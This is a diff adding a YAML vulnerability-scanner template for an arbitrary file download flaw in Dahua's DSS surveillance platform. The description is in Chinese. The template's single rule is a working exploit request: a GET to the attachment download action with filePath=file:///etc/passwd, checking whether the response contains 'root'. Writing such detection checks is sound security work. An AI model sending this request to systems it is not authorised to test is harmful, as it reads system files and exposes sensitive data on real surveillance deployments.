@@ -1,0 +1,19 @@
+name: dahua_DSS_Arbitrary_file_download
+transport: http
+set: {}
+detail:
+  dock: title="DSS-平安城市"
+  product: 浙江大华DSS（digital surveillance system）
+  homepage: https://www.dahuatech.com/
+  impact: ''
+  description: '浙江大华DSS（digital surveillance system）是一款集视频、报警、门禁、对讲四大安防子系统管理功能于一体的综合管理平台。
+
+    浙江大华技术股份有限公司DSS存在任意文件下载漏洞，攻击者可利用该漏洞登录界面下载任意文件获取敏感信息。'
+rules:
+  r1:
+    method: GET
+    path: /itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+    follow_redirects: false
+    headers: {}
+    expression: response.status == 200 && response.body.bcontains(b'root')
+expression: r1()
